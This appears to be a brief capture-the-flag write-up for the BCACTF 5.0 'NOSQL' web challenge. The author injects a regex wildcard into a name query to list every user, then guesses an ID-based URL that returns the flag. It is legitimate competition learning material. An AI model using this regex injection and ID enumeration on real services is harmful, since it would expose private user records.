# BCACTF 5.0

## NOSQL - 25 | webex

### Description: 
I found this database that does not use SQL, is there any way to break it?

Web servers:

`challs.bcactf.com:30390`

Static resources:
 [here](https://arcs-s3-repo.nyc3.cdn.digitaloceanspaces.com/no-sql/provided.js).


### Solve :

sso first we try to list all the users in db 
`http://challs.bcactf.com:30390/?name=.*`
 
we recieved

``{"rtnValues":["Ricardo Olsen","April Park","Francis Jackson","Ana Barry","Clifford Craig","Andrew Wise","Ada Atkinson","Janis McIntosh","Rosie Parsons","Neal Weaver","Alyssa Robison","Michael Hurst","Roberto Thornton","Renee Schwartz","Darryl Wilson","Wayne Boyle","Loretta Camacho","Bert Morton","Suzanne Johnson","Carol Fowler","Rose Hansen","Aimee Norman","Bethany Foley","Benjamin Baily","David Hull","Sabrina Fish","Rick Kirby","Edgar Grimes","Blake McDermott","Alicia Crosby","Teresa Ortega","Carroll Darling","Louis Tate","Phillip Fuller","Clinton Kimball","Alma Matthews","Stacie Franklin","Lucinda Steward","Gina Andrews","Philip Hyde","Devin Riggs","Michelle Thornton","Rogelio Freeman","Arthur Stephens","Andy Leon","Megan Gould","Myrna Yates","Edwin Pearce","Shirley Cannon","Lowell Cochran","Flag Holder"]}``


we know that olssen ricardo have id of 1 so flag holder after count will have id of 51 so 

`http://challs.bcactf.com:30390/51/Flag/Holder`
and yeah we got our flag 
**bcactf{R3gex_WH1z_54dfa9cdba13}**
